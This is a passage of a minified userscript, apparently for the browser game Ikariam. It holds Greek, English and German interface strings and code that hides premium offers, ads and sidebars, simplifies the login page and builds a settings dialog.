κορυφή",sideButtonPremiumTrader:'Πλαϊνό κουμπί "Έμπορος"',sideButtonDummyPackages:'Πλαϊνό κουμπί "Πακέτα ομοιωμάτων"',sideButtonFriendListEdit:'Πλαϊνό κουμπί "Προσκάλεσε φίλους"',hideBuildingDescription:"Αφαίρεση των κειμένων περιγραφής κτιρίων",tradeAdvisor:"Δήμαρχος",militaryAdvisor:"Στρατιωτικός Σύμβουλος",researchAdvisor:"Σύμβουλος Έρευνας",diplomacyAdvisor:"Σύμβουλος Διπλωματίας",port:"Εμπορικός λιμένας",transport:"Μεταφορά",city:"Προβολή πόλης",museum:"Μουσείο",safehouse:"Κρησφύγετο",culturalPossessions_assign:"Πολιτιστικά αγαθά",townHall:"Δημαρχείο",warehouse:"Αποθήκη εμπορευμάτων",dump:"Αλάνα",colonize:"Αποίκισε",barracks:"Στρατώνες",shipyard:"Ναυπηγεία",tradegood:"Παραγωγή αγαθού νησιού",resource:"Δάσος νησιού",merchantNavy:"Εμπορικός στόλος",branchOffice:"Θέση εμπορικών συναλλαγών",upgradeBuilding:"Συνέχιση αναβάθμισης κτιρίου",changeLoginScreen:"Απλοποίηση της σελίδας εισόδου",activateChangeLoginScreen:"Ενεργοποίηση της απλοποίησης σελίδας εισόδου;",deactivateChangeLoginScreen:"Απενεργοποίηση της απλοποίησης σελίδας εισόδου;",errorInsufficientFunds:"Ανεπαρκής πόροι",buldingSpeedupButton:"Κουμπί επιτάχυνσης χτισίματος",pirateShipsButton:"Αλλαγή της εικόνας του κουμπιού εμπορικών πλοίων σε πειρατικό πλοίο",hideFriendsSidebar:"Απόκρυψη της πλαϊνής μπάρας φίλων",hideFooterBar:"Απόκρυψη της μπάρας υποσέλιδου",hideFooterBarAtWorldmap:"Απόκρυψη της μπάρας και στην προβολή του χάρτη κόσμου",hideHideoutImages:"Απόκρυψη των εικόνων και κειμένων στην κατασκοπεία",disablePortLoadingTime:"Απενεργοποίηση του χρόνου φόρτωσης στα λιμάνια",useDifferentPreferences:"Χρήση διαφορετικών επιλογών για {0}",reloadPageOnPrefsSave:"Ανανέωση σελίδας μετά από αποθήκευση ρυθμίσεων",settingsTitle:IPK.Templates.settingsTitle("Επιλογές"),settings:"Ρυθμίσεις",selectWhatToHideChange:"Επιλέξτε τι θέλετε να αποκρύψετε/αλλάξετε",hilightInboxCitySubjectLinks:"Επισήμανση των συνδέσμων στα γεγονότα πόλεων με διαφορετικό χρώμα",townEventsResources:"Να γίνουνε τα εικονίδια πόρων μεγαλύτερα στα γεγονότα πόλεων",advPlusTeaser:"Συντόμευση plus στους συμβούλους",save:"Αποθήκευση",cancel:"Άκυρο",forAllServers:"για όλους τους servers",yes:"Ναί",no:"Όχι"},en:{premium:"Ikariam PLUS",changeFemaleAdvisor:"Change the female mayor",promoToolbar:"Hide gameforge promotion toolbar",happyHour:"Happy hour special offer",changeAmbrosiaFancyIcon:"Simplify ambrosia fancy icon",hideAmbrosiaFancyIcon:"Hide ambrosia fancy icon",facebookIcon:"Facebook post link",viewPremiumAdvisors:"View premium/golden advisor icons",hideAdsBanners:"Advertisements banners",tbPlus:"Toolbar plus button at the top",sideButtonPremiumTrader:'Side button "Premium-Trader"',sideButtonDummyPackages:'Side button "Dummy packages"',sideButtonFriendListEdit:'Side button "Invite friends"',hideBuildingDescription:"Hide text description of buildings",tradeAdvisor:"Mayor",militaryAdvisor:"Military advisor",researchAdvisor:"Research Advisor",diplomacyAdvisor:"Diplomatic Advisor",port:"Trading port",transport:"Transport",city:"City view",museum:"Museum",safehouse:"Hideout",culturalPossessions_assign:"Cultural goods",townHall:"Town hall",warehouse:"Warehouse",dump:"Dump",colonize:"Colonise",barracks:"Barracks",shipyard:"Shipyards",tradegood:"Island trade good",resource:"Island forest",merchantNavy:"Merchant fleet",branchOffice:"Trading post",upgradeBuilding:"Continue upgrade building",changeLoginScreen:"Simplify login page",activateChangeLoginScreen:"Activate login page simplification?",deactivateChangeLoginScreen:"Deactivate login page simplification?",errorInsufficientFunds:"Insufficient Funds",buldingSpeedupButton:"Shorten building time button",pirateShipsButton:"Change the button image of commercial ships in pirate ship",hideFriendsSidebar:"Hide friends sidebar",hideFooterBar:"Hide footer bar",hideFooterBarAtWorldmap:"Also hide bar at the wordmap view",hideHideoutImages:"No images or text in espionage",disablePortLoadingTime:"Disable port loading time",useDifferentPreferences:"Use different preferences for {0}",reloadPageOnPrefsSave:"Reload page after preferences save",settingsTitle:IPK.Templates.settingsTitle("Preferences"),settings:"Settings",selectWhatToHideChange:"Select what you like to hide/change",hilightInboxCitySubjectLinks:"Highlight cities inbox subject links with different color",townEventsResources:"Make cities inbox resource icons bigger",advPlusTeaser:"Advisors plus shortcut",save:"Save",cancel:"Cancel",forAllServers:"for all servers",yes:"Yes",no:"No"},de:{premium:"Ikariam PLUS",changeFemaleAdvisor:"Ändern Sie den weiblichen Bürgermeister",promoToolbar:"Hide gameforge Förderung Symbolleiste",happyHour:"Happy Hour Spezialangebot",changeAmbrosiaFancyIcon:"Nicht animiertes Ambrosiasymbol",hideAmbrosiaFancyIcon:"Verstecke animiertes Ambrosiasymbol",facebookIcon:"Facebook Symbol und Link",viewPremiumAdvisors:"zeige Premium/goldene Beratersymbole",hideAdsBanners:"Werbebanner",tbPlus:"Toolbar Plus Button",sideButtonPremiumTrader:'Seitentaste "Premium-Händler"',sideButtonDummyPackages:'Seitentaste "Attrappenpakete"',sideButtonFriendListEdit:'Seitentaste "Freunde einladen"',hideBuildingDescription:"Textbeschreibung Gebäude entfernen",tradeAdvisor:"Städteberater",militaryAdvisor:"Militärberater",researchAdvisor:"Forschungsberater",diplomacyAdvisor:"Diplomatieberater",port:"Handelshafen",transport:"Transport",city:"Stadtansicht",museum:"Museum",safehouse:"Versteck",culturalPossessions_assign:"Kulturgüter",townHall:"Rathaus",warehouse:"Lagerhaus",dump:"Halde",colonize:"Kolonisiere",barracks:"Kaserne",shipyard:"Kriegswerften",tradegood:"Luxus Ressourcen",resource:"Holz Ressourcen ",merchantNavy:"Handelsflotte",branchOffice:"Kontor",upgradeBuilding:"Gebäudeupgrade fortsetzen",changeLoginScreen:"vereinfachte Login Seite",activateChangeLoginScreen:"Aktiviere Loginseitenvereinfachung?",deactivateChangeLoginScreen:"Deakiviere Loginseitenvereinfachung?",errorInsufficientFunds:"Unzureichende Ressourcen",buldingSpeedupButton:"Taste Bauzeit verkürzen",pirateShipsButton:"Button Handelsschiffe in Piratenschiffe ändern",hideFriendsSidebar:"Seitenleiste Freunde ausblenden",hideFooterBar:"Fußzeile ausblenden",hideFooterBarAtWorldmap:"verstecke auch auf der Weltkarte",hideHideoutImages:"keine Bilder und Text bei Spionage",disablePortLoadingTime:"Deaktivieren Port Ladezeit",useDifferentPreferences:"Benutze anderen Server {0}",reloadPageOnPrefsSave:"Seite neu laden nach Speicherung der Einstellungen.",settingsTitle:IPK.Templates.settingsTitle("Präferenzen"),settings:"Einstellungen",selectWhatToHideChange:"Wähle was du verstecken/ändern möchtest",hilightInboxCitySubjectLinks:"Highlight Städten Posteingang unterliegen Links mit verschiedenen Farben",townEventsResources:"Machen Städten Posteingang Ressource Symbole größer",advPlusTeaser:"Advisors sowie Verknüpfung",save:"Speichern",cancel:"Abbrechen",forAllServers:"für alle Server",yes:"Ja",no:"Nein"},get:function(e){if(typeof this[this.selectedLanguage][e]!=="undefined")return this[this.selectedLanguage][e];else return this[this.defaultLanguage][e]},defaultLanguage:"en",selectedLanguage:"",getCountryParam:function(e){var t=e||this.defaultLanguage;try{locParts=location.host.split(".");if(locParts.length==4)t=locParts[1];else t=locParts[0]}catch(n){}return t},selectLanguage:function(){var e=this.getCountryParam();if(typeof this[e]!=="undefined")this.selectedLanguage=e;else this.selectedLanguage=this.defaultLanguage}};IPK.Preferences={changeLoginScreen:{id:"ikaChangeLoginScreen",def:false,global:true,touch:function(){GM_addStyle("#content #pageContent, #contentMiddle { min-height: 220px }");GM_addStyle("#content .page-content #passwordLost { height: 270px }");$("#pagefoldtarget").hide();$("#sidebarWrapper").hide();$("#btn-login").css("visibility","hidden");$("#content").css({margin:"0 auto","float":"none"});$("h2#logo").before($("<div/>").css("clear","both"));$("h2#logo").css({margin:"24px auto auto",position:"static"});$("ul#menu").hide();$("#menuBox div.lnkmenu").eq(1).hide();$("body").append($("<div/>").append($("div#player"),$("#registerForFree")).hide());$("#pageContent").empty();$("#pageContent").append($("<h2/>",{text:$("#btn-login").text()}));var e=$("#pwLost").clone().click(function(){var e="{0}//{1}/ajax/main/passwordlost".format(window.location.protocol,window.location.host);$("#fbConnect, #pageContent").hide();$("#extraContent").load(e).show()});$("#pwLost").remove();$("#pageContent").append($("<div/>",{id:"passwordLost"}).append($("form#loginForm").css({width:"205px",margin:"0 auto","padding-top":"16px"}).append(e)))}},premium:{id:"ikaPremium",def:true,touch:function(e){$("#ambrosiaSidebar h3.header",e).wrapInner($("<span/>").css("text-decoration","line-through"));$("#js_premiumSidebarAmbrosia",e).css({"background-image":IPK.Templates.cssBackground(ambrosia_gif),"padding-top":"150px"});$("#ambrosiaSidebar div.centerButton",e).hide();$("#premiumOffers div.content p",e).eq(0).hide();$("table.table01 tbody td.feature",e).not("table.table01 tbody tr.PremiumAccount td.feature").css({"padding-left":"5px","background-image":"none"});$("table.table01 tbody tr.PremiumAccount td.feature a",e).hide();$("tr td.cost, tr th.cost, tr td.buy",$("table.table01 tbody",e)).hide();$("table.table01 tbody tr td.duration",e).css("width","170px");$("table.table01 td.red.bold",e).css({color:"green","font-size":"12px","font-weight":"normal"});$(".ResearchPointsBonusExtremeLength",e).prev().hide();GM_addStyle("#container #premium_c:before, "+"#container #premiumPayment_c:before, "+"#container #premiumDetails_c:before { "+"content: "+IPK.Templates.cssBackground(premium_png)+";"+"}"+"#premiumOffers tr.priceDiscount { background-color:inherit; }")}},hilightInboxCitySubjectLinks:{id:"ikaHilightInboxCitySubjectLinks",def:false,touch:function(e){GM_addStyle("#inboxCity td.subject a { color: #DD0000 !important; }")}},townEventsResources:{id:"ikaTownEventsResources",def:true,touch:function(e){$(".value > img",e).each(function(e){var t=$(this),n=t.attr("src");if(n.indexOf("_small.")!=-1){var r=n.substring(n.lastIndexOf(".")),i=n.substring(0,n.length-r.length-1),s=i.substring(0,i.length-5)+r;t.attr("src",s)}})}},happyHour:{id:"ikaHappyHour",def:true,touch:function(){GM_addStyle("#container #btnHappyHour { visibility: hidden; }")}},hideAmbrosiaFancyIcon:{id:"ikaHideAmbrFancyIcon",def:false,touch:function(){$("#globalResources ul li.ambrosia, #globalResources ul li.ambrosiaNoSpin").hide();$("#globalResources ul li.transporters a").css("top","14px");$("#globalResources ul li.gold a").css("top","53px")}},changeAmbrosiaFancyIcon:{id:"ikaChangeAmbrFancyIcon",def:true,parent:"hideAmbrosiaFancyIcon",endisOperator:"!",touch:function(){var e="#globalResources ul li.ambrosiaNoSpin a";if(!$(e).exists())e="#globalResources ul li.ambrosia a";var t=parseInt($(e).parent().attr("title").replace(/[,\.]/g,""),10);$(e).text(t);$(e).css({"background-image":IPK.Templates.cssBackground(premiumsymbol_a_gif),top:"-32px","line-height":"102px",color:"#906646"});$(e).hover(function(){$(this).css("background-image",IPK.Templates.cssBackground(premiumsymbol_b_gif))},function(){$(this).css("background-image",IPK.Templates.cssBackground(premiumsymbol_a_gif))});$(e).bind("mousedown",function(){$(this).css("background-image",IPK.Templates.cssBackground(premiumsymbol_c_gif))})}},hideFriendsSidebar:{id:"ikaHideFriendsSidebar",def:false,touch:function(){$("#rightMenu, #js_viewChat").hide()}},hideFooterBar:{id:"ikaHideFooterBar",def:false,touch:function(){if(IPK.IkaView=="worldmap_iso"&&IPK.Preferences.get("hideFooterBarAtWorldmap")||IPK.IkaView!="worldmap_iso")$("#footer").hide()}},hideFooterBarAtWorldmap:{id:"ikaHideFooterBarAtWorldmap",def:false,parent:"hideFooterBar"},pirateShipsButton:{id:"ikaPirateShipsButton",def:false,touch:function(){GM_addStyle("#header #globalResources .transporters a { background-image: "+IPK.Templates.cssBackground(btn_shippirate_jpg)+"}")}},facebookIcon:{id:"ikaFacebookIcon",def:true,touch:function(){$("#facebook_button").css("visibility","hidden")}},viewPremiumAdvisors:{id:"ikaViewPremiumAdvs",def:true,touch:function(){GM_addStyle("#header #advisors #advCities a.normal          { background-image:url(/skin/layout/advisors/mayor_premium.png); }");GM_addStyle("#header #advisors #advCities a.normalactive    { background-image:url(/skin/layout/advisors/mayor_premium_active.png); }");GM_addStyle("#header #advisors #advMilitary a.normal        { background-image:url(/skin/layout/advisors/general_premium.png); }");GM_addStyle("#header #advisors #advMilitary a.normalactive  { background-image:url(/skin/layout/advisors/general_premium_active.png); }");GM_addStyle("#header #advisors #advMilitary a.normalalert   { background-image:url(/skin/layout/advisors/general_premium_alert.png); }");GM_addStyle("#header #advisors #advResearch a.normal        { background-image:url(/skin/layout/advisors/scientist_premium.png); }");GM_addStyle("#header #advisors #advResearch a.normalactive  { background-image:url(/skin/layout/advisors/scientist_premium_active.png); }");GM_addStyle("#header #advisors #advDiplomacy a.normal       { background-image:url(/skin/layout/advisors/diplomat_premium.png); }");GM_addStyle("#header #advisors #advDiplomacy a.normalactive { background-image:url(/skin/layout/advisors/diplomat_premium_active.png); }")}},advPlusTeaser:{id:"ikaAdvPlusTeaser",def:true,touch:function(){$("#advisors ul li").each(function(e){$("a",this).eq(1).hide()})}},hideAdsBanners:{id:"ikaHideAddsBanners",def:true,touch:function(e){GM_addStyle("#container .mainContentBox .ad_banner { display: none !important; }")}},tbPlus:{id:"ikaTbPlus",def:true,touch:function(){$("#GF_toolbar ul li.premium").hide()}},hideBuildingDescription:{id:"ikaHideBuildingDescription",def:true,touch:function(){GM_addStyle(".buildingDescription > p { display: none }")}},tradeAdvisor:{id:"ikaTrdAdv",def:true,touch:function(e){$("#premiumAdvisorSidebar",e).remove();$("div#mainview ul.tabmenu li ~ li",e).hide();GM_addStyle("#container table#inboxCity td { vertical-align: top; }");if(IPK.Preferences.get("townEventsResources"))IPK.Preferences["townEventsResources"].touch(e)}},militaryAdvisor:{id:"ikaMilAdv",def:true,touch:function(e){$("#premiumAdvisorSidebar",e).remove();GM_addStyle('tr[id^="js_MilitaryMovementsEventRow"] td:last-child a[id$="AccLoading"] { display: none; }');IPK.Ajax.filterUpdateTemplateDataForMilitaryAdvisor()}},researchAdvisor:{id:"ikaResAdv",def:true,touch:function(e){$("#mainview .content .current_research .premium_research_link",e).hide()}},diplomacyAdvisor:{id:"ikaDipAdv",def:true,touch:function(e){$("#premiumAdvisorSidebar",e).remove();$('#tab_diplomacyAdvisor .contentBox01h .content table.table01 tbody tr[id^="tbl_reply"]',e).each(function(e){$("td div.button_bar_right",this).hide()})}},port:{id:"ikaPort",def:true,touch:function(e){$("#js_tabTradeRoutes",e).remove();GM_addStyle("a.accLoading { display: none; }");$("div.tradeShip.phoenician",e).hide()}},transport:{id:"ikaTransport",def:true,touch:function(e){$("#setPremiumTransports",e).hide();$("#transportGoods .content hr",e).eq(1).hide();$("#setPremiumJetPropulsion",e).hide();$("#tradeRoute",e).hide()}},sideButtonPremiumTrader:{id:"ikaSideButtonPremiumTrader",def:true,touch:function(){$('#js_viewCityMenu ul.menu_slots li[onclick*="view=premiumTrader"]').css({position:"absolute",top:"-1000px",left:"-1000px"})}},sideButtonDummyPackages:{id:"ikaSideButtonDummyPackages",def:true,touch:function(){$('#js_viewCityMenu ul.menu_slots li[onclick*="view=premiumDummy"]').css({position:"absolute",top:"-1000px",left:"-1000px"})}},sideButtonFriendListEdit:{id:"ikaSideButtonFriendListEdit",def:true,touch:function(){$('#js_viewCityMenu ul.menu_slots li[onclick*="view=friendListEdit"]').css({position:"absolute",top:"-1000px",left:"-1000px"})}},buldingSpeedupButton:{id:"ikaBuldingSpeedupButton",def:true,touch:function(){GM_addStyle("#city #locations .building .buildingSpeedupButton, #city .buildingSpeedupButton { display: none; !important }");GM_addStyle("#city #locations .building .timetofinish.buildingSpeedup { padding: 0 16px; !important }")}},hideHideoutImages:{id:"ikaHideHideoutImages",def:true},museum:{id:"ikaMuseum",def:true,touch:function(e){$("#findTreatyPartner",e).remove()}},safehouse:{id:"ikaHideout",def:true,touch:function(e){$("#tabSafehouse #buildForm div.content a.premiumExchange",e).hide();$("#espionageReports .archiveButton",e).parent().hide()}},townHall:{id:"ikaTownHall",def:true,touch:function(e){$("#js_TownHallCitizensOrderButton",e).parent().hide();$("#js_TownHallHappinessSmall",e).parent().css("height","130px")}},warehouse:{id:"ikaWarehouse",def:true,touch:function(e){$("div.premiumOfferBox",e).hide();$("table#warehouseList tr",e).eq(-3).hide();$("table#warehouseList tr",e).eq(-2).hide()}},dump:{id:"ikaDump",def:true,touch:function(e){IPK.Preferences["warehouse"].touch(e)}},colonize:{id:"ikaColonize",def:true,touch:function(e){$("#moveCity",e).hide();$("#setPremiumJetPropulsion",e).hide();$("#createColony .content hr",e).eq(1).hide()}},barracks:{id:"ikaBarracks",def:true,touch:function(e){$("#premium_btn",e).hide();IPK.Ajax.filterUpdateTemplateDataForBarracks()}},shipyard:{id:"ikaShipyards",def:true,touch:function(e){IPK.Ajax.filterUpdateTemplateDataForBarracks()}},tradegood:{id:"ikaTradegood",def:true,touch:function(e){$("#setWorkersBox div.content div.premiumOfferBox",e).hide();$("#setWorkersBox div.content",e).css("min-height","190px");$(".dynamic.resUpgrade",e).eq(1).remove()}},resource:{id:"ikaResource",def:true,touch:function(e){IPK.Preferences["tradegood"].touch(e)}},branchOffice:{id:"ikaBranchOffice",def:true,touch:function(e){$("div.contentBox01h > div.content > table > tbody > tr",e).each(function(e,t){var n=$.getUrlVars($("td",t).eq(-1).find("a").attr("href"));if($.urlVarExists("destinationCityId",n)){var r=$("<a/>",{href:"?view=island&cityId={0}".format($.getUrlVar("destinationCityId",0,n)),text:$("td",t).eq(0).text()});$("td",t).eq(0).empty().append(r)}})}},merchantNavy:{id:"ikaMerchantNavy",def:true,touch:function(e){$(".premiumJet",e).hide();$("table.table01 .speed",e).hide();$("table.table01 td a.accLoading",e).hide()}},disablePortLoadingTime:{id:"ikaDisablePortLoadingTime",def:true},errorInsufficientFunds:{id:"ikaInsufficientFunds",def:true,touch:function(e){$("#NEResOfferPremium div.content p.premiumAd",e).hide();$("#NEResOfferPremium div.content a.yes",e).hide()}},reloadPageOnPrefsSave:{id:"reloadPageOnSave",def:true,isconfig:true,global:true},useDifferentPreferences:{id:"useDiffPrefs",def:false,isconfig:true},selectView:function(e){if(typeof this[e]!=="undefined")return this[e];else return null},exists:function(e){return this.selectView(e)!==null},apply:function(e,t){var n=this.selectView(e);if(n&&n.value&&typeof n.touch==="function")n.touch(t)},get:function(e,t){return this[e][t||"value"]},getBool:function(e,t){var n=typeof e==="string"?this.selectView(e):e;return typeof n[t]!=="undefiend"&&n[t]},isTouched:function(e){return this.getBool(e,"touched")},isGlobal:function(e){return this.getBool(e,"global")},isConfig:function(e){return this.getBool(e,"isconfig")},loadSettings:function(){var e="useDifferentPreferences",t="";this[e].value=GM_getValue(IPK.Hostname+"."+e,this[e].def);for(e in this){if(e!="useDifferentPreferences"&&typeof this[e]!=="function"){var n=GM_getValue(e,this[e].def);if(!this.isGlobal(e)){t=this["useDifferentPreferences"].value?IPK.Hostname+"."+e:e;this[e].value=GM_getValue(t,n)}else{this[e].value=n}}}},reloadSettings:function(){this.loadSettings();$("#dlg-panel form fieldset input").each(function(e){$(this).attr("checked",IPK.Preferences.get($(this).attr("name")))})},saveSettings:function(){var e="useDifferentPreferences";var t=$("input#"+this[e].id).attr("checked");var n=!t&&this[e].value;GM_setValue(IPK.Hostname+"."+e,t);$("#dlg-panel form fieldset input").each(function(r){var i=$(this).attr("name"),s=$(this).attr("checked");if(i!=e){if(!n||n&&IPK.Preferences.isConfig(i)){var o=t&&!IPK.Preferences.isGlobal(i)?IPK.Hostname+"."+i:i;GM_setValue(o,s)}}});this.loadSettings()},saveGlobalSetting:function(e,t){GM_setValue(e,t)}};IPK.PseudoFixes={militaryAdvisorReportView:{id:"militaryAdvisorReportView",pref:"militaryAdvisor",get value(){return IPK.Preferences.get(this.pref)},touch:function(e){$("#premiumAdvisorSidebar",e).remove()}},militaryAdvisorDetailedReportView:{id:"ikaMilitaryAdvisorDetailedReportView",pref:"militaryAdvisor",get value(){return IPK.Preferences.get(this.pref)},touch:function(e){$("#premiumAdvisorSidebar",e).remove()}},diplomacyAdvisorArchive:{id:"ikaDipAdvArchive",pref:"diplomacyAdvisor",get value(){return IPK.Preferences.get(this.pref)},touch:function(e){$("#premiumAdvisorSidebar",e).remove()}},diplomacyAdvisorArchiveOutBox:{id:"ikaDipAdvArchiveOutBox",pref:"diplomacyAdvisor",get value(){return IPK.Preferences.get(this.pref)},touch:function(e){$("#premiumAdvisorSidebar",e).remove()}},diplomacyAdvisorOutBox:{id:"ikaDipAdvOutBox",pref:"diplomacyAdvisor",get value(){return IPK.Preferences.get(this.pref)},touch:function(e){$("#premiumAdvisorSidebar",e).remove();$('#tab_diplomacyAdvisor .contentBox01h .content table.table01 tbody tr[id^="tbl_mail"]',e).each(function(e){$("td span.button_bar_right",this).hide()})}},diplomacyIslandBoard:{id:"ikaDipAdvIslandBoard",pref:"diplomacyAdvisor",get value(){return IPK.Preferences.get(this.pref)},touch:function(e){$("#premiumAdvisorSidebar",e).remove()}},diplomacyTreaty:{id:"ikaDipAdvTreaty",pref:"diplomacyAdvisor",get value(){return IPK.Preferences.get(this.pref)},touch:function(e){$("#premiumAdvisorSidebar",e).remove()}},diplomacyAlly:{id:"ikaDipAdvAlly",pref:"diplomacyAdvisor",get value(){return IPK.Preferences.get(this.pref)},touch:function(e){$("#premiumAdvisorSidebar",e).remove()}},culturalPossessions_assign:{id:"ikaCulturalPossessionsAssign",pref:"museum",get value(){return IPK.Preferences.get(this.pref)},touch:function(e){IPK.Preferences["museum"].touch(e)}},museumTreaties:{id:"ikaMuseumTreaties",pref:"museum",get value(){return IPK.Preferences.get(this.pref)},touch:function(e){IPK.Preferences["museum"].touch(e)}},buildingGround:{id:"ikaBuildingGround",value:true,touch:function(e){$("ul#buildings li p.cannotbuild",e).each(function(e){if($("a.premiumExchange",this).exists()){$("br",this).remove();$("a",this).hide()}else{var t=$(this).html();$(this).html(t.substring(0,t.indexOf("(")-1))}})}},takeOffer:{id:"ikaTakeOffer",pref:"branchOffice",get value(){return IPK.Preferences.get(this.pref)},touch:function(e){$("#setPremiumTransports",e).hide();$("#setPremiumJetPropulsion",e).hide();$("#setPremiumJetPropulsion ~ hr",e).eq(0).hide()}},spyMissions:{id:"ikaSpyMissions",pref:"hideHideoutImages",get value(){return IPK.Preferences.get(this.pref)},touch:function(e){$("#missionForm > div.clearfloat",e).eq(0).find("> p").hide();$("#missionForm > div.clearfloat",e).eq(1).hide()}},sendSpy:{id:"ikaSendSpy",pref:"hideHideoutImages",get value(){return IPK.Preferences.get(this.pref)},touch:function(e){IPK.PseudoFixes["spyMissions"].touch(e)}},getBool:function(e,t){return typeof this[e][t]!=="undefiend"&&this[e][t]},isTouched:function(e){return this.getBool(e,"touched")},exists:function(e){return this[e]!=="undefined"},apply:function(e,t){if(typeof this[e]!=="undefined"){if(this[e].value){this[e].touch(t)}}}};IPK.ForceFixes={buidlingPremiumExchange:{value:true,ajax:true,touch:function(e){$("#buildingUpgrade div.red_box",e).hide()}},applyAjax:function(e){this.applyAll(true,e)},applyAll:function(e,t){var n;for(n in this){if(typeof this[n]!=="function"&&this[n].value){if(typeof this[n].touched==="undefined"||typeof this[n].touched!=="undefined"&&!this[n].touched){if(!e||e&&this[n].ajax){this[n].touch(t);if(!this[n].ajax)this[n].touched=true}}}}}};IPK.SetupUI=function(){$("<link/>",{rel:"stylesheet",type:"text/css",href:"http://ajax.googleapis.com/ajax/libs/jqueryui/1.8.13/themes/sunny/jquery-ui.css"}).appendTo("head");$("<a/>",{id:"ipk_button",href:"javascript: void(0)",text:" "}).css({width:"48px",height:"48px",position:"absolute",opacity:IPK.IsLoginScreen?1:.6,background:IPK.Templates.cssBackground(no_ambrosia_icon_png,"no-repeat left top"),"z-index":600}).appendTo("body").css(IPK.IsRTL?"left":"right","10px");if(IPK.IsLoginScreen)$("a#ipk_button").css("top","42px");else $("a#ipk_button").css("bottom","10px");$("<div/>",{id:"dialog-modal",title:IPK.Language.get(IPK.IsLoginScreen?"changeLoginScreen":"settingsTitle")}).appendTo("body").append($("<div/>",{id:"dlg-panel",style:"text-align: left"}));$("#dialog-modal").hide();if(IPK.IsLoginScreen){GM_addStyle("#footer-wrapper { margin-top:25px }");$("a#ipk_button").click(function(){$("#dialog-modal").dialog({modal:true,draggable:true,resizable:false,width:380,buttons:[{text:IPK.Language.get("yes"),click:function(){IPK.Preferences.saveGlobalSetting("changeLoginScreen",!IPK.Preferences.get("changeLoginScreen"));$(this).dialog("close");IPK.Utils.doSafeReload(true)}},{text:IPK.Language.get("no"),click:function(){$(this).dialog("close")}}]})});GM_addStyle("#dialog-modal { font-weight: normal }");$("#dlg-panel").css({padding:"7px 0 7px 0"});$("#dlg-panel").append($("<p/>").append($("<span/>").css({"float":"left",margin:"0 12px 18px 0",background:IPK.Templates.cssBackground(questionmark_icon_png,"no-repeat left top"),width:"48px",height:"48px"}),$("<p/>",{text:IPK.Language.get(IPK.Preferences.get("changeLoginScreen")?"deactivateChangeLoginScreen":"activateChangeLoginScreen")}).css({padding:"5px"})))}else{$("a#ipk_button").click(function(){IPK.Preferences.reloadSettings();$("#dialog-modal").dialog({height:370,width:480,modal:true,draggable:true,resizable:false,zIndex:70001,buttons:[{text:IPK.Language.get("save"),click:function(){IPK.Preferences.saveSettings();$(this).dialog("close");if(IPK.Preferences.get("reloadPageOnPrefsSave"))IPK.Utils.doSafeReload()}},{text:IPK.Language.get("cancel"),click:function(){$(this).dialog("close")}}]})}).hover(function(){$(this).css({opacity:1},"fast")},function(){$(this).css({opacity:.6},"fast")});GM_addStyle("body div.ui-dialog:focus { border: 1px solid #8E846B; }");GM_addStyle("#dlg-panel p.title { padding: 3px 0; font-weight: bold }");GM_addStyle("#dlg-panel fieldset { padding: 7px 0 0 7px }");GM_addStyle("#dlg-panel fieldset p { padding: 2px; }");GM_addStyle("#dlg-panel fieldset p.child { padding-left: 18px; }");GM_addStyle("#dlg-panel fieldset p.child label.disable { color: grey; font-style: italic; }");$("#dlg-panel").append($("<div/>").css({background:IPK.Templates.cssBackground(zoferos_logo_png,"no-repeat center center"),width:"200px",height:"100px",margin:"10px auto"}),$("<p/>",{html:"Zoferos © 2013"}).css("text-align","center"),$("<hr/>").css("color","#474747"));$("#dlg-panel").append($("<form/>").append($("<p/>",{"class":"title",text:IPK.Language.get("settings")+":"}),$("<fieldset/>",{id:"ipk_config"}).css("margin-bottom","5px"),$("<p/>",{"class":"title",text:IPK.Language.get("selectWhatToHideChange")+":"}),$("<fieldset/>",{id:"ipk_preferences"})));var fnOnParentClick=function(event,element){var $this=element||$(this),pName=$this.attr("name");$.each(IPK.Preferences[pName].children,function(index,value){var enable=$this.attr("checked");if(typeof IPK.Preferences[value].endisOperator!=="undefined")enable=eval(IPK.Preferences[value].endisOperator+enable.toString());if(enable){$("#"+IPK.Preferences[value].id).removeAttr("disabled");$('label[for="'+IPK.Preferences[value].id+'"]').removeClass("disable")}else{$("#"+IPK.Preferences[value].id).attr("disabled","disabled");$('label[for="'+IPK.Preferences[value].id+'"]').addClass("disable")}})};var propName="";for(propName in IPK.Preferences){if(typeof IPK.Preferences[propName]!=="function"){var addTo=IPK.Preferences.isConfig(propName)?"#ipk_config":"#ipk_preferences",lblText=IPK.Language.get(propName),isChild=typeof IPK.Preferences[propName].parent!=="undefined";if(!IPK.Preferences.isConfig(propName)&&IPK.Preferences.isGlobal(propName))lblText=IPK.Templates.globalPreference(lblText);if(propName=="useDifferentPreferences")lblText=IPK.Language.get(propName).format('<span style="font-style: italic">{0}</span>'.format(IPK.Hostname));$(addTo).append($("<p/>",{"class":isChild?"child":""}).append($("<input/>",{type:"checkbox",id:IPK.Preferences[propName].id,name:propName,checked:IPK.Preferences[propName].value}),$("<label/>",{"for":IPK.Preferences[propName].id,html:" "+lblText})));if(isChild){$("#"+IPK.Preferences[IPK.Preferences[propName].parent].id).click(fnOnParentClick);if(typeof IPK.Preferences[IPK.Preferences[propName].parent].children==="undefined")IPK.Preferences[IPK.Preferences[propName].parent].children=[];IPK.Preferences[IPK.Preferences[propName].parent].children.push(propName)}}}$.each(IPK.Preferences,function(e,t){if(typeof t.children!=="undefined")fnOnParentClick(null,$("#"+t.id))})}};IPK.Island={originalScreenUpdate:null,hook:function(){var e=this;e.originalScreenUpdate=unsafeWindow.island.Screen.update;unsafeWindow.island.Screen.update=function(t){e.originalScreenUpdate.call(this,t);$("div.cityLocation.constr").each(function(e,n){var r=$(n).attr("id"),i=r.match(/cityLocation(\d+)/);if(i!==null){var s=parseInt(i[1]),o="?view=cityDetails&destinationCityId={0}".format(t.cities[s].id);$("#js_cityLocation{0}Link".format(s)).attr("href",o)}})}}};IPK.Ajax={ajaxResponse:null,changeViewIndex:-1,updateGlobalDataIndex:-1,updateTemplateDataIndex:-1,changeViewId:"",changeViewContent:null,originalParseResponse:null,originalShowPortLoadingCountdown:null,hook:function(){var 